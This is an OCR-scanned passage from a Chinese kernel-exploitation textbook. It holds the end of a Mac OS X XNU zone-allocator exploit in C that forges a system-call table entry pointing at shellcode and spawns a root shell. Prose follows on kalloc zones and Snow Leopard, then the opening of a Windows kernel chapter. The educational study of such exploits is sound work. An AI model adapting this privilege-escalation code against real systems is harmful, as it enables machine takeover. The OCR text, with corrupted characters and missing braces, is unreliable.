if（ds.kern_ptr!=0)(
allocl=ds.kern_ptr:
printf（"al1oc1@0x%x\n"，ds.kern_ptr);
ioct1（fd,ADDBUFFER,&ds）;
if（ds.kern_ptr!=0）{
al1oc2=ds.kern_ptr;
printf（"a11oc2@0x%x\n",ds.kern_ptr);
ioct1（fd,ADDBUFFER,&ds）;
if(!ds.kern_ptr){
printf("[+]Shellcodefailedtobeallocated\n"):
exit（1);
ret=ds.kern_ptr;
printf（"she11code@0x%x\n"，ds.kern_ptr);
printf（"[+]Freeingallocl\n");
ds.kern_ptr=allocl:
ioct1(fd,FREEBUFFER,&ds);
if（ds.kern_ptr!=0）{
printf("freefailed.\n");
printf"[+]Freeingalloc2\n");
ds.kern_ptr=a11oc2:
---
## Page 227
218第二部分UNIX家族、MacOSX和Windows
ioct1（fd.FREEBUFFER,&ds);
if（ds.kern_ptr!=0){
printf("free failed.\n"):
exit(1);
ptr=&attackstring[BUFFSIZE-sizeof(void*)]:
*ptr=sc_addr;
printf("[+]Performingoverwrite\n");
ds.size=BUFFSIZE:
ioct1(fd,ADDBUFFER,&ds）;
if（ds.kern_ptr!=0){
printf（"newalloc@0x%x\n"，ds.kern_ptr):
printf("[+]Movingsysentaddresstofree_1ist\n");
ds.size=10:
ioct1(fd,ADDBUFFER,&ds）;
if(ds.kern_ptr!-0){
allocl=ds.kern_ptr;
ds.size=10:
printf("[+]Settingupfakesyscallentry.\n"):
fsysent.sy_narg=1;
fsysent.sy_resv=0;
fsysent.sy_f1ags=0;
fsysent.sy_call=(void*)ret:
fsysent.sy_arg_munge32=NULL;
fsysent.sy_arg_munge64=NULL;
fsysent.sy_return_type=0;
fsysent.sy_arg_bytes=4;
ds.data
=&fsysent;
ds.size
=sizeof(fsysent);
ds.kern_ptr=0:
ioct1(fd,ADDBUFFER,&ds）;
sysca11(21,0.0,0);
printf（"uid:%ieuid:%i\n",getuid(),geteuid（））;
execve(*shell,shell,env);
前面提到过，zone分配符是kalloc（）（内核分配符）的基础。事实上，内核分配符（在
XNU中应用最广泛的是general-purpose分配符）简单地封装了zalloc功能。在kalloc的初
始化中，可以使用zone分配符创建一些zone。每一个zone存储不同大小的分配空间。如果一
个分配空间比最大的zone还要大，将使用kmem_al1ocate（），kmem_allocate（）仅仅用来
创建新的页映射。k_zone_name数组存储每个zone的名字：
---
## Page 228
第5章MacOSX219
staticconstchar*k_zone_name[16]-1
"kalloc.1"，
"ka11oc.2",
"ka11oc.4"，
"ka11oc.8",
"kalloc.16",
"ka11oc.32"，
"ka1loc.64",
"ka11oc.128"，
"ka1loc.256"，
"kalloc.512",
"ka110c.1024",
"kal1oc.2048"，
"ka11oc.4096",
"ka11oc.8192"，
"ka11oc.16384"，
"kal1oc.32768"
当发生一个kalloc分配，将会对比每个zone的大小，然后直接调用zalloc_
canblock（）来分配一个新的chunk。基于这个特点，之前zalloc代码中的技术将应用在
kal1oc已分配的缓冲区中。
竞态条件
XNU内核是有优先权区分的，因此，竞态条件很丰富。作者担心一些XNU的未公开漏洞
会导致竞态。然而，这些漏洞的利用与其他UNIX系统的漏洞利用是一样的，所以在第4章中
我们讨论的技术能够完全应用于MacOSX上。
SnowLeopard利用
就像本章引l言中描述的，在编写本书时，MacOSX的最新的版本叫做SnowLeopard，是
一个64位操作系统。对内核的改动很小。SnowLeopard默认地启动一个32位内核和一个
64位用户态。这意味着本章讨论的大部分技术还是能够应用于SnowLeopard系统上。Snow
Leopard系统也能使用64位内核进行初始化，但是到目前为止，还没有什么变化能限制我们所
描述的技术的使用。
小结
系统很适合做漏洞研究，但是此领域中没有多少文档资料。它的用户在最近几年也以很快的
速度增长。
MacOSX的设计不同于本书中讨论的其他主流的操作系统x86/x86-64架构的系统，这
就产生了一些具有挑战性的工作。最有意思的挑战就是它把用户态和内核态分开。因此我们
料中的。Mac系统是由BSD衍生出来的，因此它仍然属于UNIX家族成员。
因为Mac系统并不是完全开源的，所以我们把主要精力集中在调试和逆向工程中，这些工
---
## Page 229
220第二部分UNIX家族、MacOSX和Windows
作展示了闭源扩展中呈现出许多有趣的（存在漏洞的）路径（使用IDAPRO软件）。在第6章
中我们将继续讨论闭源操作系统一一Windows操作系统的漏洞利用。
尾注
1.http://developer.apple.com/mac/library/technotes/tn2004/tn2118.html.
2.http://butnotyet.tumblr.com/post/175132533/the-story-of-a-simple-and-dangerous-kernel-
bug.
3.http://landonf.bikemonkey.org/code/macosx/Leopard_PT_DENY_ATTACH.20080122.html.
---
## Page 230
第6章
Windows
本章主要内容
·Windows内核概述
·执行阶段
·Windows漏洞利用实践
引言
来自比尔·盖茨的可信计算备忘录—1/15/2002
......
每周都有关于各种软件中新发现的安全问题的报告。其中既有一些单独的应用
程序和服务，也包括Windows、Linux、UNIX和其他的操作系统平台。有一些团队，
他们为交付安全修复而昼夜工作，而这些修复方案都是针对已经出现的问题开发出来
的，在这方面我们已经做得很好了。我们得到的好评是无与伦比的一但是作为业界
的引领者，我们能够也必须做到更好。鉴于这些问题出现在由微软、合作伙伴及客户
所开发的软件里，新的设计方法需要开发减少此类问题的数量。我们需要使用户自动
获得这些修复带来的益处，并确保软件足够安全，使客户不再担心安全问题。
......
之前，依靠更多的功能和特色，以及更大程度的可扩展性，已经使得我们的软件
和服务被用户所信服。在这方面我们已经做了非常多的工作，但是如果用户不信任软
件的安全性，所做的这些努力就毫无意义。所以现在，当面临这样的选择：是增加功
能、特色还是解决安全问题的时候，我们需要选择安全。
距离这篇比尔·盖茨写的著名的备忘录发给微软每一位员工已经过去了九年。基于以上
的要求，从WindowsXPSP2开始，Windows操作系统的安全性已经全面得到了提高。当这
篇备忘录发出的时候，影响Windows产品的可利用的严重漏洞的数量已经到达了一个危险的
数值，这迫使微软将它的注意力放在提高整个系统的安全性上。一些经微软改进的安全方法
在Windows中广泛使用。例如已经在其他操作系统中应用的数据执行保护（DataExeccution
Prevention，DEP）和地址空间格局随机化（AddressSpaceLayoutRandomization，ASLR），它
---
## Page 231
222第二部分UNIX家族、MacOSX和Windows
们和“最小权限原则”的实施相结合，而且随后还将一种最新发现的“默认安全保护”（secure
bydefault）引l人到Windows中。
当Windows操作系统整体上采用了一种更为安全的架构后，Windows内核也随之开始从功
能性和安全性两方面进行改进。在本章中，我们将看到一些常见的Windows内核漏洞，研究怎
样利用它们，并且讨论内核上最新的变化是如何影响到利用向量和内核的payload的。
在继续讲述之前，我们先从内核的角度讨论一下Windows发行的不同版本。从历史角度上
讲，Windows操作系统在推销时分为服务器版本和桌面（desktop）版本，然而，这种不同并不
是体现在底层的内核层次上。
忽略更早的Windows版本（那些现在已不再使用的），可以认为Windows20o0（通常我们
也称其为WindowsNT5.0）底层的内核是第二代NT内核的第一个版本。这个版本中的大多数
功能和内核接口对之后引I人的Windows版本都产生了很大的影响。2001年，WindowsNT/2000
和以往的Windows桌面型产品相结合产生了WindowsXP（通常称为WindowsNT5.1）。类似
地，服务器市场在几年以后被非常流行的WindowsServer2003（也称为WindowsNT5.2）占
领。在本书写作之时，在微软的产品中，WindowsServer2003仍然是最普遍的服务器解决方案。
从2003年年底到2007年年初，微软为WindowsXP和Windows2003发布了一些服务包一
WindowsXPSP2和WindowsServer2003SP1，并引I人了一些安全方面的增强措施，以致很多
人已经把这些服务包等同于各自的操作系统的新版本了。
2006年年底，微软发布了一款新的操作系统一WindowsVista（通常也称为WindowsNT
6.0）。在WindowsVista中，完全重写了一些内核组件，一些内部的内核结构被改造成更坚固的
形式，因此从漏洞利用的角度可以把这个内核看成是一个新的主流分支。
微软刚发布了Windows最新的版本一Windows7（也称为WindowsNT6.1），将其定位
成一个桌面型的方案，而WindowsServer2008R2则是WindowsServer2008的增强版，不过
它只支持64位平台。
除了Windows的发布版本，我们也必须考虑另一个重要的方面：操作系统运行时所在的
处理器。随着WindowsXP（以及WindowsXPx64）和WindowsServer2003的使用，微软开
始支持64位的处理器，包括安腾处理器和基于x86-64架构的处理器。理想的情况是，每个
Windows内核的64位版本都运行在纯64位的环境中（在x86-64架构中，为了向后兼容而保
留了一些对于32位应用程序的支持）。由于没有所谓的64位应用程序或者驱动，微软不需要
保持向后兼容性，所以在用户态和内核态都开始添加很多有趣的新特性和API，例如布置基于
栈结构异常处理、引I入基于表的unwind异常处理、固定DEP以及内核补丁保护（KernelPatch
Protection，KPP）等。
考虑了这么多之后，为了避免重复，在本章中我们将只分析两种前面提到的内核。一种
是WindowsServer2003SP2（32位版本，NT5.2）的内核，另一种是WindowsServer2008
R2SP2（64位版本，NT6.1）的内核。您可以把对NT5.1内核的描述应用到NT5.x主流
内核家族中的所有成员中。NT6.1内核对于NT6.x家族也是一样。现在我们先对Windows
NT内核进行一个简单描述，然后讨论一下需要创建的调试环境以便于分析示例利用场景。
---
## Page 232
第6章Windows223
Windows内核概述
Windows的内核本质上是一个庞大的整体的内核，以至于操作系统的核心和设备的驱
动程序都共享同一个内存地址空间，都运行在合适的最高的权限级别（在x86/x86-64中是
Ring0）。我们最先关注的也是我们最感兴趣的组件是核心执行程序（KernelExecutive）。这
个组件实现了最基本的操作系统的功能：进程、线程、虚拟存储、中断和陷阱处理、异常管
理、快速缓存管理、I/O管理、异步程序调用、注册表、对象管理、事件（也称作同步原语
synchronizationprimitive），以及很多其他的底层接口。核心执行程序在Ntoskrnl.exe中实
现，它的二进制程序就在目录路径C:IWINDOWSISYSTEM32\中。针对单核处理器（UP）
和多核处理器（SMP）内核仍然存在不同版本；而且在32位系统上也有基于物理地址扩展
（PhysicalAddressExtension，PAE）的不同的内核，如表6.1所示。表中总结了所有内核的
名称以及它们所应用的环境。
表6.1不同的内核文件
内核文件名
独特文件名（UP）
独特文件名
Ntoskrnl.exe
Ntoskrnl.exe
Ntkrnlmp.exe
Ntkrnlpa.exe（PAE)
Ntkrnlpa.exe
Ntkrpamp.exe
另一个我们将要关注的重要内核组件是硬件抽象层（HardwareAbstractionLayer，HAL），
它负责使设备驱动和内核执行程序不因特定硬件平台的差别而有所不同（硬件平台无关性）。
HAL在hal.dll模块中实现，相对于内核执行程序而言，HAL的版本有所不同，由它是在单处
理器系统还是在多处理器系统中而定。其余的组件当做内核驱动（或称作模块）加载到正在执
行的内核中。例如，win32k.sys实现了Windows子系统以及操作系统的GUI的内核部分，而
tcpip.sys则实现了大多数TCP/IP网络协议栈。
内核信息收集
有些时候不同的内核版本会对我们准备使用的攻击向量产生一些影响。为了选择
合适的方法人侵，需要知道工作在哪个系统配置下。为达到这个目标，我们首先要知
道正确的操作系统版本。为了确定版本，当利用一个本地权限提升的漏洞时，可以使
用接口GetVersionExO向系统本身询问操作系统的版本号。这个函数会使用一个称为
OSVERSIONIFO的结构体返回操作系统的主要版本号、次要版本号和内部版本号。可以利用
来自用户态进程的代码得到Windows操作系统的版本，如下面的代码所示：
9